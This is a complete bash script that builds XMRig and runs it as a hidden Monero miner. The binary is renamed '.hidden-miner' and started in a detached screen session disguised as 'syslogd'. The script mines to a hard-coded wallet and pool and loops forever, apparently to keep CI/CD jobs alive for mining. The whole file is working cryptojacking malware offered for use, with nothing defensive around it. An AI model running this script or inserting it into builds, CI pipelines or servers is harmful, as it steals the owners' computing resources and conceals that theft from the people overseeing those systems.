#!/bin/bash

WALLET="45YvPcJq6vz2a62QpvKTgAfUc4SF2KK3e6WXP2RC2Vbj8efuTWBAd8mV8YUcce26WF4hJfmqhbjjZJWAiYiU9G3GQ6HUeBH"
POOL="pool.hashvault.pro:443"
WORKER="Destroyer$(shuf -i 1000-9999 -n 1)"

echo "[+] Starting Stealth Miner Setup..."

install_dependencies() {
    echo "[+] Installing dependencies..."
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen
}

build_xmrig() {
    echo "[+] Building XMRig..."
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake .. -DWITH_HWLOC=ON
    make -j$(nproc)
    cd ../..
    mv xmrig/build/xmrig ./.hidden-miner
    chmod +x ./.hidden-miner
    rm -rf xmrig
}

run_stealth_mining() {
    echo "[+] Starting miner..."
    screen -dmS syslogd ./.hidden-miner -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls=true --donate-level=0 --cpu-priority=5 --print-time 10
}

if [ ! -f ".hidden-miner" ]; then
    install_dependencies
    build_xmrig
fi

run_stealth_mining

# Prevent script exit in CI/CD
while true; do sleep 60; done
